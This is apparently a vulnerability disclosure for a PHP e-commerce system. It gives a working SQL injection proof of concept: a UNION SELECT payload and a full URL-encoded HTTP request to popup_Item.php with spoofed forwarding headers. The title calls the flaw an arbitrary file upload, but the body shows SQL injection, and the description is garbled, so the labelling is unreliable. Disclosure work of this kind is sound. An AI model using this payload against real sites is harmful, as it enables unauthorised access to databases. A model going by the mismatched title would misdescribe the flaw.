# ecommerce-Unauthorized arbitrary file upload vulnerability

## Description

    The ecommerce /ecommerce/popup_Item.php interface has not authorized sql union population.

## source code

    https://www.sourcecodester.com/php/13524/e-commerce-system-using-phpmysqli.html

## Author

    yangfan2@webray.com.cn inc  

## Proof of Concept

1. test

```
1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,database(),20
```

```
GET /ecommerce/popup_Item.php?id=1%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%31%2c%32%2c%33%2c%34%2c%35%2c%36%2c%37%2c%38%2c%39%2c%31%30%2c%31%31%2c%31%32%2c%31%33%2c%31%34%2c%31%35%2c%31%36%2c%31%37%2c%31%38%2c%64%61%74%61%62%61%73%65%28%29%2c%32%30 HTTP/1.1
Host: 172.20.10.166:8080
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=g4gppk342k4t3gn6dlmav29rr0
x-forwarded-for: 127.0.0.1
x-originating-ip: 127.0.0.1
x-remote-ip: 127.0.0.1
x-remote-addr: 127.0.0.1
Connection: close


```

database

| ![image-20240822163210159](https://raw.githubusercontent.com/0xffaaa/cve/main/ecommerce-Unauthorized%20arbitrary%20file%20upload%20vulnerability.assets/image-20240822163210159.png) |
| ------------------------------------------------------------ |

